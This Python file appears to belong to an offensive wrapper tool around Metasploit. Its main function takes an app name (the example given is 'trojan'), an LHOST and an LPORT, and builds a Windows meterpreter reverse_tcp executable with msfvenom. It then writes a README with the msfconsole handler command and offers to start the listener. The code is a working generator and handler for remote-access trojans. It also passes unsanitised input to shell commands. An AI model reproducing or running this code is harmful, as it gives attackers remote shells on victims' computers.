
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), "..","lib"))
from inputandother_text import *

def start_windows_exploit():
	starting_text_centered()
	appname_input = input("Please enter app name (only name ex. trojan) option: ")
	lhost_input = input("Please enter lhost option: ")
	lport_input = input("Please enter lport option: ")
	starting_text_centered()
	os.system("mkdir -p app/"+appname_input+" && msfvenom -p windows/meterpreter/reverse_tcp LHOST="+lhost_input+" LPORT="+lport_input+" -f exe -a x86 --platform windows > app/"+appname_input+"/"+appname_input+".exe")
	f = open("app/"+appname_input+"/README_PLS.txt", "w")
	f.write("App Name: "+appname_input+"\nLHOST: "+lhost_input+"\nLPORT: "+lport_input +"\nMSFCONSOLE Command: msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LPORT "+lport_input+";set LHOST "+lhost_input+" ;exploit'")
	f.close()
	ended_text_centered()
	run_exploit = input("Run exploit ? (yes/no)")
	if run_exploit == str("yes"):
		print("RUNNING EXPLOIT\n".center(terminal_columns_size))
		os.system("msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LPORT "+lport_input+";set LHOST "+lhost_input+" ;exploit'")
		
	ended_text_centered()


def start_msfconsole():
	starting_text_centered()
	os.system("msfconsole")
	ended_text_centered()



def start_ifconfig():
	os.system("clear && ifconfig")
